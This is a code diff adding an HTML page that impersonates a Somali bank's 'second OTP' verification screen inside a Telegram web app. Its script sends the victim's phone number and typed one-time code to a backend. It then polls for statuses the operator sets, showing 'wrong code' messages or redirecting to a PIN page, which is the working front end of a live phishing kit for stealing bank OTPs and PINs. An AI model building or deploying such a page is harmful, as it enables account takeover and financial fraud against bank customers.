@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xaqiijinta Kodka Labaad (OTP) - Salaam Bank</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background-color: #0d1b2a; 
+            color: #e2e8f0;
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
+
+        .container { flex: 1; padding: 40px 20px; text-align: center; }
+        h2 { font-size: 22px; color: #f8fafc; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 14px; color: #94a3b8; line-height: 1.5; margin-bottom: 25px; }
+
+        .otp-inputs { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
+        .otp-inputs input {
+            width: 52px; 
+            height: 60px;
+            border: 1.5px solid #334155;
+            background-color: #0f172a;
+            color: #38bdf8;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .otp-inputs input:focus { border-color: #38bdf8; }
+        .resend-text { font-size: 13px; color: #64748b; margin-bottom: 30px; }
+
+        .btn-verify {
+            width: 100%; 
+            max-width: 320px;
+            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid #334155;
+            background-color: #1e293b;
+            color: #64748b;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .btn-verify.active { 
+            background: linear-gradient(135deg, #003366 0%, #004080 100%); 
+            color: #f8fafc; 
+            border-color: #1e40af;
+            cursor: pointer; 
+        }
+
+        /* --- LOADING OVERLAY --- */
+        #loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(13, 27, 42, 0.95);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999; color: #f8fafc;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #1e293b;
+            border-top: 4px solid #38bdf8; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .footer {
+            position: relative; height: 180px;
+            background: linear-gradient(135deg, #001f3f 0%, #002244 100%);
+            border-top: 1px solid #1e3a5f;
+            border-top-left-radius: 50% 60px; border-top-right-radius: 50% 60px;
+            display: flex; justify-content: center; align-items: center; color: #64748b;
+            font-size: 12px; margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div style="font-size: 18px; font-weight: bold;">Fadlan sug...</div>
+</div>
+
+<div class="container">
+    <h2>Xaqiijinta Kodka Labaad (OTP)</h2>
+    <p>Geli kodka labaad ee OTP-ga ah ee loo soo diray nambarkaaga telefoonka si aad u sii wadato.</p>
+
+    <div class="otp-inputs">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+    </div>
+
+    <div class="resend-text" id="timer-text"></div>
+    <button class="btn-verify" id="verify-btn" disabled>XAQIIJI KODKA LABAAD (OTP)</button>
+    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
+</div>
+
+<div class="footer">© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</div>
+
+<script>
+const phone = localStorage.getItem('phone');
+const inputs = document.querySelectorAll('.otp-inputs input');
+const btn = document.getElementById('verify-btn');
+const timerDisplay = document.getElementById('timer-text');
+const statusMsg = document.getElementById('status-msg');
+const overlay = document.getElementById('loading-overlay');
+
+let countdown;
+let pollingInterval;
+
+window.onload = () => {
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+    if (!phone) { window.location.href = "/page6"; return; }
+    inputs[0].focus();
+    startTimer();
+};
+
+function startTimer() {
+    let secondsLeft = 60;
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        secondsLeft--;
+        if (secondsLeft <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#38bdf8; cursor:pointer; font-weight:bold;">Kodu dib u dir</span>';
+            document.getElementById('resend-btn').onclick = resendCode;
+        } else {
+            timerDisplay.innerText = `Kodu dib u dirid ${secondsLeft} ilbiriqsi ka dib`;
+        }
+    }, 1000);
+}
+
+async function resendCode() {
+    timerDisplay.innerText = "Kod cusub ayaa loo soo dirayaa...";
+    
+    try {
+        await fetch('/api/resend-otp-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, step: "Second OTP" })
+        });
+    } catch (e) {}
+
+    setTimeout(startTimer, 2000);
+}
+
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        checkFull();
+    });
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+    });
+});
+
+function checkFull() {
+    const isComplete = Array.from(inputs).every(i => i.value !== '');
+    btn.disabled = !isComplete;
+    btn.classList.toggle('active', isComplete);
+}
+
+btn.addEventListener('click', submitOtp);
+
+async function submitOtp() {
+    if (btn.disabled) return;
+    const otp = Array.from(inputs).map(i => i.value).join('');
+
+    overlay.style.display = 'flex';
+    statusMsg.innerText = "";
+
+    try {
+        await fetch('/api/verify-second-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp })
+        });
+        startPolling();
+    } catch {
+        overlay.style.display = 'none';
+        statusMsg.style.color = "#fca5a5";
+        statusMsg.innerText = "Cillad ayaa dhacday.";
+    }
+}
+
+function startPolling() {
+    clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "otp2_correct") {
+                clearInterval(pollingInterval);
+                window.location.href = "/success.html";
+            } 
+            else if (data.status === "otp2_wrongpin") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none';
+                window.location.href = "/page6?error=wrongpin";
+            } 
+            else if (data.status === "otp2_wrong") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none'; 
+                statusMsg.style.color = "#fca5a5";
+                statusMsg.innerText = "❌ Kodka OTP-ga waa magal.";
+                resetInputs();
+            }
+        } catch {}
+    }, 3000);
+}
+
+function resetInputs() {
+    inputs.forEach(i => i.value = "");
+    btn.classList.remove('active');
+    btn.disabled = true;
+}
+</script>
+</body>
+</html>
